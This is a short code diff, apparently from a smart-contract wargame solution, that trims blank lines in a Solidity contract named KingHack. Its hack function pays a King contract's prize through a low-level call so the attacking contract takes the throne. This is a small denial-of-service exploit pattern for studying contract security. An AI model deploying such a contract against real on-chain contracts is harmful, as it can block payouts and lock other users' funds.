@@ -25,10 +25,8 @@ contract King {
 }
 
 contract KingHack {
-
     function hack(address payable _king) public payable {
         uint256 prize = King(_king).prize();
         _king.call{value: prize}("");
     }
-
 }
